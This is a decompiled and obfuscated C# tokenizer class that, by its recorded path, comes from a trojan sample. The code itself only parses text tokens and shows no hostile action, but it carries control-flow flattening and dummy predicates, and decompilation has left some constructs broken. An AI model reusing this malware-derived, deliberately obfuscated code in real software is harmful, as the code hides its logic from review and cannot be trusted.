// Decompiled with JetBrains decompiler
// Type: ProjNet.Serialization.ErrorFacadeSerializer
// Assembly: IRefl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A29A65F6-B7ED-422C-83D4-B9EFD61E5F13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-8e89881e34371e10b7f9cb943183a061aab9b22853cb7192e1ac09401f4cc545.exe

using IRefl.Definitions;
using ProjNet.Structs;
using System;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace ProjNet.Serialization
{
  internal class ErrorFacadeSerializer
  {
    private SpecialFrame m_Descriptor;
    private TextReader _Resolver;
    private string product;
    private bool _Dic;
    private int _Exception;
    private int m_Error;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ErrorFacadeSerializer(TextReader config, bool rejectattr)
    {
      int num1 = 6;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              PageAdvisorStructBuilder.PrepareCreator();
              num2 = 5;
              continue;
            case 1:
            case 2:
              this._Exception = 1;
              this.m_Error = 1;
              goto case 4;
            case 3:
              if (config != null)
              {
                this._Resolver = config;
                this._Dic = rejectattr;
                num2 = 7;
                continue;
              }
              goto label_10;
            case 4:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              int num3 = 3;
              num2 = ErrorFacadeSerializer.InstantiateList() ? num3 : num3;
              continue;
            case 5:
              goto label_3;
            case 7:
              goto label_2;
            default:
              goto label_7;
          }
        }
label_3:
        this._Dic = false;
        num1 = 1;
        continue;
label_7:
        num1 = 4;
      }
label_2:
      return;
label_10:
      throw new ArgumentNullException("reader");
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public int UpdateProcess() => this._Exception;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public int RemoveProcess() => this.m_Error;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public double ExcludeProcess()
    {
      int num1 = 4;
      if (true)
        goto label_4;
label_1:
      string s;
      double num2 = double.Parse(s, (IFormatProvider) CultureInfo.InvariantCulture.NumberFormat);
      int num3 = 5;
label_3:
      num1 = num3;
label_4:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            goto label_6;
          case 1:
          case 2:
            goto label_2;
          case 3:
            goto label_1;
          case 5:
            goto label_8;
          default:
            num1 = 3;
            continue;
        }
      }
label_2:
      if (this.CustomizeProcess() != (SpecialFrame) 1)
        throw new ArgumentException(string.Format((IFormatProvider) CultureInfo.InvariantCulture.NumberFormat, "The token '{0}' is not a number at line {1} column {2}.", new object[3]
        {
          (object) s,
          (object) this.UpdateProcess(),
          (object) this.RemoveProcess()
        }));
      goto label_1;
label_6:
      s = this.MoveProcess();
      num3 = 2;
      goto label_3;
label_8:
      return num2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string MoveProcess() => this.product;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public SpecialFrame CustomizeProcess() => this.m_Descriptor;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public SpecialFrame ComputeProcess(bool isfirst)
    {
      int num1 = 4;
      SpecialFrame process;
      while (true)
      {
        bool flag;
        int num2;
        SpecialFrame specialFrame;
        switch (num1)
        {
          case 0:
          case 4:
            flag = isfirst;
            int num3 = 2;
            num1 = ErrorFacadeSerializer.InstantiateList() ? num3 : num3;
            continue;
          case 1:
          case 2:
            if (flag)
            {
              num2 = 5;
              goto label_7;
            }
            else
            {
              specialFrame = this.CheckProcess();
              goto case 3;
            }
          case 3:
            break;
          case 5:
label_5:
            specialFrame = this.ReflectProcess();
            break;
          case 6:
            goto label_11;
          default:
            num2 = 3;
            goto label_7;
        }
        process = specialFrame;
        if (!ErrorFacadeSerializer.InstantiateList())
        {
          num1 = 6;
          continue;
        }
        goto label_5;
label_7:
        num1 = num2;
      }
label_11:
      return process;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public SpecialFrame ConcatProcess() => this.ComputeProcess(this._Dic);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private SpecialFrame CheckProcess()
    {
      int num1 = 1;
      if (!ErrorFacadeSerializer.InstantiateList())
        goto label_12;
label_1:
      int num2 = 0;
label_3:
label_4:
      bool flag1 = num2 != 0;
      int num3 = 11;
label_11:
      num1 = num3;
label_12:
      char[] buffer;
      bool flag2;
      SpecialFrame specialFrame;
      bool flag3;
      ASCIIEncoding asciiEncoding;
      while (true)
      {
        char last1;
        char last2;
        bool flag4;
        int num4;
        int num5;
        switch (num1)
        {
          case 0:
label_17:
            goto label_18;
          case 1:
            goto label_46;
          case 2:
            specialFrame = (SpecialFrame) 0;
            flag3 = true;
            goto label_10;
          case 3:
            goto label_39;
          case 4:
label_14:
            specialFrame = (SpecialFrame) 0;
            flag3 = true;
            goto label_15;
          case 5:
          case 13:
label_31:
            if (flag4)
            {
              ++this._Exception;
              this.m_Error = 1;
            }
            this.product += last1.ToString();
            if (this.m_Descriptor == specialFrame)
            {
              if (this.m_Descriptor == (SpecialFrame) 5 && last1 != '-')
              {
                num1 = 6;
                continue;
              }
              goto label_2;
            }
            else
              goto label_34;
          case 6:
            goto label_1;
          case 7:
          case 12:
            num5 = last2 == '_' ? 1 : 0;
            goto label_29;
          case 8:
            this.m_Descriptor = ErrorFacadeSerializer.QueryProcess(last1);
            specialFrame = ErrorFacadeSerializer.QueryProcess(last2);
            if (flag3 && last1 == '_')
              this.m_Descriptor = (SpecialFrame) 0;
            if (flag3 && this.m_Descriptor == (SpecialFrame) 1)
              this.m_Descriptor = (SpecialFrame) 0;
            if (this.m_Descriptor != (SpecialFrame) 0)
            {
              num5 = 0;
              goto label_29;
            }
            else
              goto label_45;
          case 9:
            goto label_23;
          case 10:
            goto label_37;
          case 11:
            if (flag1)
            {
              byte[] bytes = new byte[1]
              {
                (byte) this._Resolver.Peek()
              };
              char[] chars = asciiEncoding.GetChars(bytes);
              last1 = buffer[0];
              last2 = chars[0];
              if (ErrorFacadeSerializer.UpdateList())
              {
                num1 = 8;
                continue;
              }
              goto label_26;
            }
            else
              goto label_48;
          case 14:
            flag4 = this.m_Descriptor == (SpecialFrame) 2;
            if (ErrorFacadeSerializer.UpdateList())
            {
              num1 = 5;
              continue;
            }
            goto label_39;
          case 15:
            goto label_24;
          case 16:
            goto label_26;
          case 17:
            num4 = !flag2 ? 1 : 0;
            break;
          case 18:
            goto label_49;
          default:
            goto label_13;
        }
label_7:
        if (num4 == 0)
          goto label_18;
        else
          goto label_8;
label_10:
        if (this.m_Descriptor == (SpecialFrame) 0 && specialFrame == (SpecialFrame) 1)
          goto label_14;
label_15:
        if (last1 != '-' || specialFrame != (SpecialFrame) 1)
        {
          num4 = 0;
          goto label_7;
        }
        else
        {
          if (true)
          {
            num1 = 17;
            continue;
          }
          goto label_17;
        }
label_18:
        if (flag2 && specialFrame == (SpecialFrame) 1 && last1 == '.')
          this.m_Descriptor = (SpecialFrame) 1;
        if (this.m_Descriptor == (SpecialFrame) 1 && last2 == '.' && !flag2)
        {
          specialFrame = (SpecialFrame) 1;
          flag2 = true;
        }
        ++this.m_Error;
        num1 = 14;
        continue;
label_29:
        if (num5 != 0)
        {
          if (ErrorFacadeSerializer.UpdateList())
            num1 = 2;
          else
            goto label_31;
        }
        else
          goto label_10;
      }
label_2:
      num2 = this._Resolver.Read(buffer, 0, 1);
      goto label_3;
label_8:
      this.m_Descriptor = (SpecialFrame) 1;
      specialFrame = (SpecialFrame) 1;
      num3 = 0;
      goto label_11;
label_13:
      num3 = 4;
      goto label_11;
label_23:
      num2 = this._Resolver.Read(buffer, 0, 1);
      num3 = 3;
      goto label_11;
label_24:
      asciiEncoding = new ASCIIEncoding();
      goto label_4;
label_26:
      this.product = "";
      this.m_Descriptor = (SpecialFrame) 3;
      num3 = 9;
      goto label_11;
label_34:
      num2 = 0;
      goto label_3;
label_37:
      buffer = new char[1];
      num3 = 16;
      goto label_11;
label_39:
      flag2 = false;
      flag3 = false;
      num3 = 15;
      goto label_11;
label_45:
      num3 = 12;
      goto label_11;
label_46:
      specialFrame = (SpecialFrame) 3;
      num3 = 10;
      goto label_11;
label_48:
      SpecialFrame descriptor = this.m_Descriptor;
      num3 = 18;
      goto label_11;
label_49:
      return descriptor;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static SpecialFrame QueryProcess(char last)
    {
      int num1 = 5;
      SpecialFrame specialFrame;
      while (true)
      {
        bool flag;
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            if (!flag)
            {
              if (!char.IsLetter(last))
              {
                if (last != '\n')
                {
                  if (char.IsWhiteSpace(last))
                  {
                    num3 = 1;
                    break;
                  }
                  goto case 1;
                }
                else
                {
                  specialFrame = (SpecialFrame) 2;
                  num2 = 4;
                  goto label_8;
                }
              }
              else
                goto label_14;
            }
            else
              goto label_12;
          case 1:
          case 3:
            num3 = char.IsControl(last) ? 1 : 0;
            break;
          case 2:
          case 4:
          case 6:
          case 7:
            goto label_17;
          case 5:
            flag = char.IsDigit(last);
            int num4 = 0;
            num1 = ErrorFacadeSerializer.InstantiateList() ? num4 : num4;
            continue;
          default:
            if (ErrorFacadeSerializer.UpdateList())
            {
              num1 = 1;
              continue;
            }
            goto case 0;
        }
        if (num3 == 0)
        {
          specialFrame = (SpecialFrame) 5;
          num2 = 7;
        }
        else
        {
          specialFrame = (SpecialFrame) 4;
          num2 = 6;
        }
label_8:
        num1 = num2;
      }
label_12:
      specialFrame = (SpecialFrame) 1;
      goto label_17;
label_14:
      specialFrame = (SpecialFrame) 0;
label_17:
      return specialFrame;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private SpecialFrame ReflectProcess()
    {
      int num1 = 2;
      if (true)
        goto label_6;
label_1:
      SpecialFrame specialFrame1;
      SpecialFrame specialFrame2 = specialFrame1;
      int num2 = 6;
label_5:
      num1 = num2;
label_6:
      while (true)
      {
        int num3;
        switch (num1)
        {
          case 0:
            num3 = specialFrame1 == (SpecialFrame) 2 ? 1 : 0;
            break;
          case 1:
          case 5:
label_11:
            if (specialFrame1 == (SpecialFrame) 4)
            {
              num3 = 1;
              break;
            }
            if (true)
            {
              num1 = 0;
              continue;
            }
            goto label_13;
          case 2:
            goto label_8;
          case 3:
          case 4:
            goto label_1;
          case 6:
            goto label_13;
          default:
            int num4 = 4;
            num1 = ErrorFacadeSerializer.InstantiateList() ? num4 : num4;
            continue;
        }
        if (num3 != 0)
        {
          specialFrame1 = this.CheckProcess();
          goto label_11;
        }
        else
          goto label_1;
      }
label_8:
      specialFrame1 = this.CheckProcess();
      num2 = 5;
      goto label_5;
label_13:
      return specialFrame2;
    }

    internal static bool UpdateList() => true;

    internal static bool InstantiateList() => false;
  }
}
